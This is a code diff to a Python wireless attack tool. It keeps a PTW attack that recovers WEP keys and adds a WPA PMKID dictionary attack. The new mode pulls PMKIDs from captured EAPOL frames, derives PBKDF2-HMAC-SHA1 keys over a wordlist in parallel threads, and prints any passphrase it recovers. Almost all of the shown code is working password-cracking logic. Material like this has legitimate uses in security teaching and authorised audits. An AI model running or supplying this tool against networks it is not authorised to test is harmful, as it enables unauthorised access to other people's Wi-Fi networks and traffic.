@@ -1,8 +1,14 @@
 import argparse
 import copy
 import numpy as np
-from scapy.all import rdpcap
+from scapy.all import rdpcap, Dot11, EAPOL
 import sys
+import hmac
+from hashlib import pbkdf2_hmac, sha1
+import threading
+import concurrent.futures
+import time
+from tqdm import tqdm
 
 # Constants
 ARP_HEADER = bytes.fromhex("AAAA030000000806")
@@ -331,75 +337,172 @@ def printkey(key, keylen: int):
 def isvalidpkt(pkt):
     return ((len(pkt[0]) == 86 or len(pkt[0]) == 68) and bytes(pkt[0])[0] == 8)
 
+def calculate_pmkid(pmk, ap_mac, sta_mac):
+    """
+    Calculates the PMKID with HMAC-SHA1[pmk + ("PMK Name" + bssid + clientmac)]
+    128 bit PMKID will be matched with captured PMKID to check if passphrase is valid
+    """
+    pmkid = hmac.new(pmk, b"PMK Name" + ap_mac + sta_mac, sha1).digest()[:16]
+    return pmkid
+
+def find_pw_chunk(pw_list, ssid, ap_mac, sta_mac, captured_pmkid, stop_event, progress):
+    """
+    Finds the passphrase by computing pmk and passing into calculate_pmkid function.
+    256 bit pmk calculation: passphrase + salt(ssid) => PBKDF2(HMAC-SHA1) of 4096 iterations
+    """
+    for pw in pw_list:
+        if stop_event.is_set():
+            break
+        password = pw.strip()
+        pmk = pbkdf2_hmac("sha1", password.encode("utf-8"), ssid, 4096, 32)
+        pmkid = calculate_pmkid(pmk, ap_mac, sta_mac)
+        if pmkid == captured_pmkid:
+            print(f"\nKEY FOUND! [ {password} ]")
+            print(f"Master Key: {pmk.hex()}")
+            # Setting Transient Key and EAPOL HMAC to all zeros
+            transient_key = "00" * 32
+            eapol_hmac = "00" * 16
+            print(f"Transient Key: {transient_key}")
+            print(f"EAPOL HMAC: {eapol_hmac}")
+            stop_event.set()
+        progress.update(1)
+
+def extract_pmkid(pcap_file):
+    packets = rdpcap(pcap_file)
+    pmkid_list = []
+
+    for pkt in packets:
+        if pkt.haslayer(Dot11):
+            ap_mac = pkt.addr2  # AP MAC Address
+            sta_mac = pkt.addr1  # STA MAC Address
+
+            if pkt.haslayer(EAPOL):
+                raw_data = bytes(pkt)
+                if len(raw_data) >= 0x76:  # Checking for PMKID presence
+                    pmkid = raw_data[-16:].hex()
+                    pmkid_list.append((ap_mac, sta_mac, pmkid))
+
+    if not pmkid_list:
+        print("No PMKID found in the capture file.")
+    else:
+        for ap, sta, pmkid in pmkid_list:
+            print(f"AP MAC: {ap} | STA MAC: {sta} | PMKID: {pmkid}")
+    return pmkid_list
+
 def main():
-    parser = argparse.ArgumentParser(description="PTW Attack Implementation")
+    parser = argparse.ArgumentParser(description="PTW/WPA Attack Implementation")
     parser.add_argument("capturefile", help="Path to the capture file")
+    parser.add_argument("-e", "--essid", help="SSID of Target AP")
+    parser.add_argument("-P", "--wordlist", help="Dictionary wordlist to use")
     args = parser.parse_args()
 
-    print("Processing packets, could take a while")
-    try:
-        pcap = rdpcap(args.capturefile)
-    except scapy.error.Scapy_Exception:
-        print("Error. PCAP file could not be read")
-        return
-    except FileNotFoundError:
-        print("File not found. Please check your file again")
-        return
+    if args.essid and args.wordlist:
+        ssid = args.essid.encode()
+        wordlist = args.wordlist
 
-    numstates = 0
-    total_tested_keys = 0
-    total_ivs = 0
-    try:
-        for pkt in pcap:
-            if isvalidpkt(pkt):
-                # Packet is ARP
-                currenttable = -1
-                for k in range(len(networktable)):
-                    if networktable[k].bssid == pkt[0].addr2 and networktable[k].keyid == pkt[1].keyid:
-                        currenttable = k
+        pmkid_list = extract_pmkid(args.capturefile)
 
-                if currenttable == -1:
-                    # Allocate new table
-                    print("Allocating a new table")
-                    print("bssid = " + str(pkt[0].addr2) + " keyindex=" + str(pkt[1].keyid))
-                    numstates += 1
-                    networktable.append(network())
-                    networktable[numstates-1].state = newattackstate()
-                    networktable[numstates-1].bssid = pkt[0].addr2
-                    networktable[numstates-1].keyid = pkt[1].keyid
-                    currenttable = numstates - 1
-
-                iv = pkt[1].iv
-                # Get known plaintext
-                arp_known = ARP_HEADER
-                if pkt[0].addr1 == BROADCAST_MAC or pkt[0].addr3 == BROADCAST_MAC:
-                    arp_known += ARP_REQUEST
-                else:
-                    arp_known += ARP_RESPONSE
-
-                keystream = GetKeystream(pkt[1].wepdata, arp_known)
-                addsession(networktable[currenttable].state, iv, keystream)
-                total_ivs += 1
-
-        print("Analyzing packets")
-        for k in range(len(networktable)):
-            print("bssid = " + str(networktable[k].bssid) + " keyindex=" + str(networktable[k].keyid) + " packets=" + str(networktable[k].state.packets_collected))
-            print("Checking for 40-bit key")
-            if computekey(networktable[k].state, key, 5, KEYLIMIT / 10) == 1:
-                printkey(key, 5)
-                return
-            print("Checking for 104-bit key")
-            if computekey(networktable[k].state, key, 13, KEYLIMIT) == 1:
-                printkey(key, 13)
-                return
-
-            print("Key not found")
+        if not pmkid_list:
+            print("No PMKID could be extracted. Exiting...")
             return
 
-    except Exception as e:
-        print(e)
+        stop_event = threading.Event()
 
-    print(f"[{total_tested_keys}] Tested {total_tested_keys} keys (got {total_ivs} IVs)")
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor, open(wordlist, "r", encoding='ISO-8859-1') as file:
+            start = time.perf_counter()
+            chunk_size = 100000
+            futures = []
+
+            total_lines = sum(1 for line in open(wordlist, "r", encoding='ISO-8859-1'))
+            progress = tqdm(total=total_lines, desc="Cracking Progress")
+
+            for ap_mac, sta_mac, pmkid in pmkid_list:
+                bssid = bytes.fromhex(ap_mac.replace(":", ""))
+                client = bytes.fromhex(sta_mac.replace(":", ""))
+                pmkid = bytes.fromhex(pmkid)
+
+                while True:
+                    pw_list = file.readlines(chunk_size)
+                    if not pw_list:
+                        break
+
+                    if stop_event.is_set():
+                        break
+
+                    future = executor.submit(find_pw_chunk, pw_list, ssid, bssid, client, pmkid, stop_event, progress)
+                    futures.append(future)
+
+                for future in concurrent.futures.as_completed(futures):
+                    pass
+
+            finish = time.perf_counter()
+            progress.close()
+            print(f'[+] Finished in {round(finish-start, 2)} second(s)')
+    else:
+        print("Processing packets, could take a while")
+        try:
+            pcap = rdpcap(args.capturefile)
+        except scapy.error.Scapy_Exception:
+            print("Error. PCAP file could not be read")
+            return
+        except FileNotFoundError:
+            print("File not found. Please check your file again")
+            return
+
+        numstates = 0
+        total_tested_keys = 0
+        total_ivs = 0
+        try:
+            for pkt in pcap:
+                if isvalidpkt(pkt):
+                    # Packet is ARP
+                    currenttable = -1
+                    for k in range(len(networktable)):
+                        if networktable[k].bssid == pkt[0].addr2 and networktable[k].keyid == pkt[1].keyid:
+                            currenttable = k
+
+                    if currenttable == -1:
+                        # Allocate new table
+                        print("Allocating a new table")
+                        print("bssid = " + str(pkt[0].addr2) + " keyindex=" + str(pkt[1].keyid))
+                        numstates += 1
+                        networktable.append(network())
+                        networktable[numstates-1].state = newattackstate()
+                        networktable[numstates-1].bssid = pkt[0].addr2
+                        networktable[numstates-1].keyid = pkt[1].keyid
+                        currenttable = numstates - 1
+
+                    iv = pkt[1].iv
+                    # Get known plaintext
+                    arp_known = ARP_HEADER
+                    if pkt[0].addr1 == BROADCAST_MAC or pkt[0].addr3 == BROADCAST_MAC:
+                        arp_known += ARP_REQUEST
+                    else:
+                        arp_known += ARP_RESPONSE
+
+                    keystream = GetKeystream(pkt[1].wepdata, arp_known)
+                    addsession(networktable[currenttable].state, iv, keystream)
+                    total_ivs += 1
+
+            print("Analyzing packets")
+            for k in range(len(networktable)):
+                print("bssid = " + str(networktable[k].bssid) + " keyindex=" + str(networktable[k].keyid) + " packets=" + str(networktable[k].state.packets_collected))
+                print("Checking for 40-bit key")
+                if computekey(networktable[k].state, key, 5, KEYLIMIT / 10) == 1:
+                    printkey(key, 5)
+                    return
+                print("Checking for 104-bit key")
+                if computekey(networktable[k].state, key, 13, KEYLIMIT) == 1:
+                    printkey(key, 13)
+                    return
+
+                print("Key not found")
+                return
+
+        except Exception as e:
+            print(e)
+
+        print(f"[{total_tested_keys}] Tested {total_tested_keys} keys (got {total_ivs} IVs)")
 
 networktable = []
 key = [None] * MAINKEYBYTES
